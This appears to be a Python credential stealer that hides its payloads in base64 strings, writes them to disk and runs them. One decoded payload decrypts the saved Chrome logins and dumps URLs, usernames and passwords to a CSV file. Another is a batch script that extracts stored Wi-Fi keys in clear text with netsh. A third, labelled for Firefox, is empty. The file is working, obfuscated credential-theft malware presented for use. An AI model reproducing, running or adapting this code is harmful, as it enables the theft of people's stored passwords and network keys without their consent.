import base64
import subprocess
import os

wifi_password = """
QGVjaG8gb2ZmCmVjaG8gJWRhdGUlICV0aW1lJT4+c2VuaGFzX3dpZmkudHh0CmVjaG8gJXVzZXJuYW1lJT4+c2VuaGFzX3dpZmkudHh0CmVjaG8gLSA+PnNlbmhhc193aWZpLnR4dApuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBuYW1lPSoga2V5PWNsZWFyID4+c2VuaGFzX3dpZmkudHh0CmVjaG8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gPj4gc2VuaGFzX3dpZmkudHh0
"""
chrome_password = """
aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgppbXBvcnQgYmFzZTY0CmltcG9ydCBzcWxpdGUzCmZyb20gd2luMzIgaW1wb3J0IHdpbjMyY3J5cHQKZnJvbSBDcnlwdG9kb21lLkNpcGhlciBpbXBvcnQgQUVTCmltcG9ydCBzaHV0aWwKaW1wb3J0IGNzdgoKQ0hST01FX1BBVEhfTE9DQUxfU1RBVEUgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZSIlKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10pKQpDSFJPTUVfUEFUSCA9IG9zLnBhdGgubm9ybXBhdGgociIlc1xBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhIiUob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSkpCgpkZWYgZ2V0X3NlY3JldF9rZXkoKToKICAgIHRyeToKICAgICAgICAjKDEpIEdldCBzZWNyZXRrZXkgZnJvbSBjaHJvbWUgbG9jYWwgc3RhdGUKICAgICAgICB3aXRoIG9wZW4oIENIUk9NRV9QQVRIX0xPQ0FMX1NUQVRFLCAiciIsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0gZi5yZWFkKCkKICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGxvY2FsX3N0YXRlKQogICAgICAgIHNlY3JldF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICAgICAgI1JlbW92ZSBzdWZmaXggRFBBUEkKICAgICAgICBzZWNyZXRfa2V5ID0gc2VjcmV0X2tleVs1Ol0KICAgICAgICBzZWNyZXRfa2V5ID0gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoc2VjcmV0X2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4gc2VjcmV0X2tleQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBDaHJvbWUgc2VjcmV0a2V5IGNhbm5vdCBiZSBmb3VuZCIpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgIApkZWYgZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgcGF5bG9hZCk6CiAgICByZXR1cm4gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKCmRlZiBnZW5lcmF0ZV9jaXBoZXIoYWVzX2tleSwgaXYpOgogICAgcmV0dXJuIEFFUy5uZXcoYWVzX2tleSwgQUVTLk1PREVfR0NNLCBpdikKCmRlZiBkZWNyeXB0X3Bhc3N3b3JkKGNpcGhlcnRleHQsIHNlY3JldF9rZXkpOgogICAgdHJ5OgogICAgICAgICMoMy1hKSBJbml0aWFsaXNhdGlvbiB2ZWN0b3IgZm9yIEFFUyBkZWNyeXB0aW9uCiAgICAgICAgaW5pdGlhbGlzYXRpb25fdmVjdG9yID0gY2lwaGVydGV4dFszOjE1XQogICAgICAgICMoMy1iKSBHZXQgZW5jcnlwdGVkIHBhc3N3b3JkIGJ5IHJlbW92aW5nIHN1ZmZpeCBieXRlcyAobGFzdCAxNiBiaXRzKQogICAgICAgICNFbmNyeXB0ZWQgcGFzc3dvcmQgaXMgMTkyIGJpdHMKICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSBjaXBoZXJ0ZXh0WzE1Oi0xNl0KICAgICAgICAjKDQpIEJ1aWxkIHRoZSBjaXBoZXIgdG8gZGVjcnlwdCB0aGUgY2lwaGVydGV4dAogICAgICAgIGNpcGhlciA9IGdlbmVyYXRlX2NpcGhlcihzZWNyZXRfa2V5LCBpbml0aWFsaXNhdGlvbl92ZWN0b3IpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0X3BheWxvYWQoY2lwaGVyLCBlbmNyeXB0ZWRfcGFzc3dvcmQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzcy5kZWNvZGUoKSAgCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIiVzIiVzdHIoZSkpCiAgICAgICAgcHJpbnQoIltFUlJdIFVuYWJsZSB0byBkZWNyeXB0LCBDaHJvbWUgdmVyc2lvbiA8ODAgbm90IHN1cHBvcnRlZC4gUGxlYXNlIGNoZWNrLiIpCiAgICAgICAgcmV0dXJuICIiCiAgICAKZGVmIGdldF9kYl9jb25uZWN0aW9uKGNocm9tZV9wYXRoX2xvZ2luX2RiKToKICAgIHRyeToKICAgICAgICBwcmludChjaHJvbWVfcGF0aF9sb2dpbl9kYikKICAgICAgICBzaHV0aWwuY29weTIoY2hyb21lX3BhdGhfbG9naW5fZGIsICJMb2dpbnZhdWx0LmRiIikgCiAgICAgICAgcmV0dXJuIHNxbGl0ZTMuY29ubmVjdCgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIiVzIiVzdHIoZSkpCiAgICAgICAgcHJpbnQoIltFUlJdIENocm9tZSBkYXRhYmFzZSBjYW5ub3QgYmUgZm91bmQiKQogICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgI0NyZWF0ZSBEYXRhZnJhbWUgdG8gc3RvcmUgcGFzc3dvcmRzCiAgICAgICAgd2l0aCBvcGVuKCdjaHJvbWVfcGFzc3dvcmRzLmNzdicsIG1vZGU9J3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBkZWNyeXB0X3Bhc3N3b3JkX2ZpbGU6CiAgICAgICAgICAgIGNzdl93cml0ZXIgPSBjc3Yud3JpdGVyKGRlY3J5cHRfcGFzc3dvcmRfZmlsZSwgZGVsaW1pdGVyPScsJykKICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbImluZGV4IiwidXJsIiwidXNlcm5hbWUiLCJwYXNzd29yZCJdKQogICAgICAgICAgICAjKDEpIEdldCBzZWNyZXQga2V5CiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBnZXRfc2VjcmV0X2tleSgpCiAgICAgICAgICAgICNTZWFyY2ggdXNlciBwcm9maWxlIG9yIGRlZmF1bHQgZm9sZGVyICh0aGlzIGlzIHdoZXJlIHRoZSBlbmNyeXB0ZWQgbG9naW4gcGFzc3dvcmQgaXMgc3RvcmVkKQogICAgICAgICAgICBmb2xkZXJzID0gW2VsZW1lbnQgZm9yIGVsZW1lbnQgaW4gb3MubGlzdGRpcihDSFJPTUVfUEFUSCkgaWYgcmUuc2VhcmNoKCJeUHJvZmlsZSp8XkRlZmF1bHQkIixlbGVtZW50KSE9Tm9uZV0KICAgICAgICAgICAgZm9yIGZvbGRlciBpbiBmb2xkZXJzOgogICAgICAgICAgICAJIygyKSBHZXQgY2lwaGVydGV4dCBmcm9tIHNxbGl0ZSBkYXRhYmFzZQogICAgICAgICAgICAgICAgY2hyb21lX3BhdGhfbG9naW5fZGIgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcJXNcTG9naW4gRGF0YSIlKENIUk9NRV9QQVRILGZvbGRlcikpCiAgICAgICAgICAgICAgICBjb25uID0gZ2V0X2RiX2Nvbm5lY3Rpb24oY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgICAgICAgICBpZihzZWNyZXRfa2V5IGFuZCBjb25uKToKICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICAgICAgICAgIGZvciBpbmRleCxsb2dpbiBpbiBlbnVtZXJhdGUoY3Vyc29yLmZldGNoYWxsKCkpOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBsb2dpblswXQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGxvZ2luWzFdCiAgICAgICAgICAgICAgICAgICAgICAgIGNpcGhlcnRleHQgPSBsb2dpblsyXQogICAgICAgICAgICAgICAgICAgICAgICBpZih1cmwhPSIiIGFuZCB1c2VybmFtZSE9IiIgYW5kIGNpcGhlcnRleHQhPSIiKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMoMykgRmlsdGVyIHRoZSBpbml0aWFsaXNhdGlvbiB2ZWN0b3IgJiBlbmNyeXB0ZWQgcGFzc3dvcmQgZnJvbSBjaXBoZXJ0ZXh0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg0KSBVc2UgQUVTIGFsZ29yaXRobSB0byBkZWNyeXB0IHRoZSBwYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNlcXVlbmNlOiAlZCIlKGluZGV4KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVUkw6ICVzXG5Vc2VyIE5hbWU6ICVzXG5QYXNzd29yZDogJXNcbiIlKHVybCx1c2VybmFtZSxkZWNyeXB0ZWRfcGFzc3dvcmQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIioiKjUwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg1KSBTYXZlIGludG8gQ1NWIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbaW5kZXgsdXJsLHVzZXJuYW1lLGRlY3J5cHRlZF9wYXNzd29yZF0pCiAgICAgICAgICAgICAgICAgICAgI0Nsb3NlIGRhdGFiYXNlIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICNEZWxldGUgdGVtcCBsb2dpbiBkYgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltFUlJdICVzIiVzdHIoZSkp
"""
firefox_password = """



"""
decoded = None

decoded = base64.b64decode(chrome_password).decode('ascii')
with open('stealer_chrome.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_chrome.py').read())

decoded = None

decoded = base64.b64decode(firefox_password).decode('ascii')
with open('stealer_firefox.py', 'w') as file:
    file.write(decoded)

exec(open('stealer_firefox.py').read())

decoded = None

decoded = base64.b64decode(wifi_password).decode('ascii')
with open('wifi_password.bat', 'w') as file:
    file.write(decoded)

subprocess.run(r'wifi_password.bat')


#os.remove('stealer_chrome.py')
#os.remove('stealer_firefox.py')
os.remove('wifi_password.bat')
